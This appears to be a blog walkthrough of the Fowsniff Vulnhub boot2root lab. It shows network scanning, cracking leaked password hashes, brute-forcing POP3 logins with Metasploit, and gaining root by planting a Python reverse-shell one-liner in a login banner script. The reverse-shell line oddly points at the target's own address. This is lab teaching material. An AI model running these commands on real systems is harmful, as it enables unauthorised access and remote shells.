@@ -1,0 +1,437 @@
+
+								
+																		Fowsniff: 1 Vulnhub Walkthrough
+								
+								
+								
+								
+									
+										posted inCTF Challenges									
+									
+									
+									on November 19, 2018
+									
+									 by										
+											Raj Chandel
+										
+										
+									
+									
+									
+									
+	SHARE
+	
+	
+		
+			
+			
+			
+				(function(d, s, id)
+				{
+					var js, fjs = d.getElementsByTagName(s)[0];
+					if (d.getElementById(id)) return;
+					js = d.createElement(s); js.id = id;
+					js.src = "//connect.facebook.net/en_US/all.js#xfbml=1";
+					fjs.parentNode.insertBefore(js, fjs);
+				}(document, 'script', 'facebook-jssdk'));
+			
+			
+			
+		
+		
+		
+		
+						Tweet
+			
+			
+				!function(d, s, id)
+				{
+					var js,fjs=d.getElementsByTagName(s)[0];if(!d.getElementById(id)){js=d.createElement(s);js.id=id;js.src="//platform.twitter.com/widgets.js";fjs.parentNode.insertBefore(js,fjs);}
+				}(document, "script", "twitter-wjs");
+			
+		
+		
+		
+		
+			
+			
+			
+			
+			
+			  (function()
+			  {
+				var po = document.createElement('script'); po.type = 'text/javascript'; po.async = true;
+				po.src = 'https://apis.google.com/js/plusone.js';
+				var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(po, s);
+			  })();
+			
+		
+		
+		
+		
+						
+			
+			
+			
+		
+		
+	
+	
+	
+									
+																	
+								
+								
+																
+								
+									Hello friends! Today we are going to take another boot2root challenge known as Fowsniff. The credit for making this VM machine goes to “berzerk0” and it is another boot2root challenge in which our goal is to get root access to complete the challenge. You can download this VM here.
+Security Level: Beginner
+Flags: There is one flag (flag.txt).
+Table of Contents:
+
+Port scanning and IP discovery.
+Hitting on port 80
+Finding hashes on Pastebin
+Decoding hashes
+Brute force pop3 login
+Connecting to pop3
+Finding SSH username and password
+Finding privilege escalation vectors
+Exploiting Misconfiguration in system
+Getting root access.
+Reading the flags.
+
+Walkthrough
+Let’s start off with scanning the network to find our target.
+
+		
+		
+			
+			
+			
+			
+netdiscover
+			
+				
+					
+				
+					1
+				
+						netdiscover
+					
+				
+			
+		
+
+
+We found our target –&gt; 192.168.1.29
+Our next step is to scan our target with nmap.
+
+		
+		
+			
+			
+			
+			
+nmap -A -p- -T4 192.168.1.29
+			
+				
+					
+				
+					1
+				
+						nmap -A -p- -T4 192.168.1.29
+					
+				
+			
+		
+
+
+The NMAP output shows us that there are 4 ports open: 22(SSH), 80(HTTP), 110(POP3), 143(IMAP)
+We find that port 80 is running http, so we open the IP in our browser.
+
+We don’t find anything on the webpage. Dirb scan and Nikto also didn’t reveal anything, so we googled “fowsniff corp” and found a Pastebin link that contained username and passwords. (You can find the link here)
+
+We cracked the hashes use this site and find passwords to the respective email addresses. But only 8 hashes were cracked and there are 9 usernames.
+
+So we create two wordlists one for username and one for passwords, we will use this to brute force pop3 login.
+
+We use Metasploit-framework to brute force pop3 login. After running the brute forcing pop3 login we find the correct credentials to be “seina:scoobydoo2”.
+
+		
+		
+			
+			
+			
+			
+msf &gt; use auxiliary/scanner/pop3/pop3_login
+msf auxiliary(scanner/pop3/pop3_login) &gt; set rhosts 192.168.1.29
+msf auxiliary(scanner/pop3/pop3_login) &gt; set user_file user.txt
+msf auxiliary(scanner/pop3/pop3_login) &gt; set pass_file pass.txt
+msf auxiliary(scanner/pop3/pop3_login) &gt; set verbose false
+msf auxiliary(scanner/pop3/pop3_login) &gt; run
+			
+				
+					
+				
+					123456
+				
+						msf &gt; use auxiliary/scanner/pop3/pop3_loginmsf auxiliary(scanner/pop3/pop3_login) &gt; set rhosts 192.168.1.29msf auxiliary(scanner/pop3/pop3_login) &gt; set user_file user.txtmsf auxiliary(scanner/pop3/pop3_login) &gt; set pass_file pass.txtmsf auxiliary(scanner/pop3/pop3_login) &gt; set verbose falsemsf auxiliary(scanner/pop3/pop3_login) &gt; run
+					
+				
+			
+		
+
+ 
+We connect to pop3 service on the target server and login using the credentials we retrieved. After logging in we list the messages and find there are 2 messages.
+
+		
+		
+			
+			
+			
+			
+nc 192.168.1.29 110
+user seina
+pass scoobydoo2
+list
+			
+				
+					
+				
+					1234
+				
+						nc 192.168.1.29 110user seinapass scoobydoo2list
+					
+				
+			
+		
+
+
+We retrieved the 1st message and find that it contains the password to connect through SSH.
+
+		
+		
+			
+			
+			
+			
+retr 1
+			
+				
+					
+				
+					1
+				
+						retr 1
+					
+				
+			
+		
+
+
+We retrieved the second message and find a message that hints that use the username “baksteen”.
+
+		
+		
+			
+			
+			
+			
+retr 2
+			
+				
+					
+				
+					1
+				
+						retr 2
+					
+				
+			
+		
+
+
+We use the credentials “baksteen:S1ck3nBluff+secureshell” to login through SSH.
+
+		
+		
+			
+			
+			
+			
+ssh baksteen@192.168.1.29
+			
+				
+					
+				
+					1
+				
+						ssh baksteen@192.168.1.29
+					
+				
+			
+		
+
+
+After gaining access we enumerate the system, as user “baksteen” belongs to two different groups. We use to try to find files that belong to the “users” group and find a file called “cube.sh”.
+
+		
+		
+			
+			
+			
+			
+find / -group users -type f 2&gt;/dev/null
+			
+				
+					
+				
+					1
+				
+						find / -group users -type f 2&gt;/dev/null
+					
+				
+			
+		
+
+
+We take a look at the content of the file and find it contains the message that comes once we login through SSH.
+
+		
+		
+			
+			
+			
+			
+cd /opt/cube
+cat cube.sh
+			
+				
+					
+				
+					12
+				
+						cd /opt/cubecat cube.sh
+					
+				
+			
+		
+
+
+We open the file with vim and add python reverse shell one-liner in the file.
+
+		
+		
+			
+			
+			
+			
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.1.29",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+			
+				
+					
+				
+					1
+				
+						python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.1.29",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+					
+				
+			
+		
+
+
+We try to run it and find it gives an error “python: command is not found”. We try to locate Python and find it contains python3.
+
+So we make changes to the exploit we change the python reverse shell one-liner. We replace python with python3.
+
+		
+		
+			
+			
+			
+			
+python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.1.29",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+			
+				
+					
+				
+					1
+				
+						python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.1.29",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+					
+				
+			
+		
+
+
+As when we login through SSH we get a banner similar to the one that “cube.sh” contains. So we check “/etc/update-motd.d/” directory to look for executables that might run this program and find that file “00-header” runs this shell script.
+
+So now we exit the SSH and set up our listener using netcat, then we again connect through SSH. So that our reverse shell gets executed.
+
+		
+		
+			
+			
+			
+			
+ssh baksteen@192.168.1.29
+			
+				
+					
+				
+					1
+				
+						ssh baksteen@192.168.1.29
+					
+				
+			
+		
+
+
+As soon as we successfully login, we get a reverse shell as root user on our netcat listener. We go to the root directory and find the file called “flag.txt”. We take a look at the content of the file and find the congratulatory message.
+
+		
+		
+			
+			
+			
+			
+nc -lvp 1234
+id
+cd /root
+cat flag.txt
+			
+				
+					
+				
+					1234
+				
+						nc -lvp 1234idcd /rootcat flag.txt
+					
+				
+			
+		
+
+
+Author: Sayantan Bera is a technical writer at hacking articles and cybersecurity enthusiast. Contact Here
+Share this:Click to share on Twitter (Opens in new window)Click to share on Facebook (Opens in new window)Like this:Like Loading...									
+																	
+								
+								
+															
+							
+								Afonso Alves November 19, 2018 at 11:14 pm							
+							
+							
+														
+							
+								How did you know that you had to use the python liner reverse shell and is there another alternative?
+								
+															
+							
+							
+							
+								Reply ↓							
+							
+						
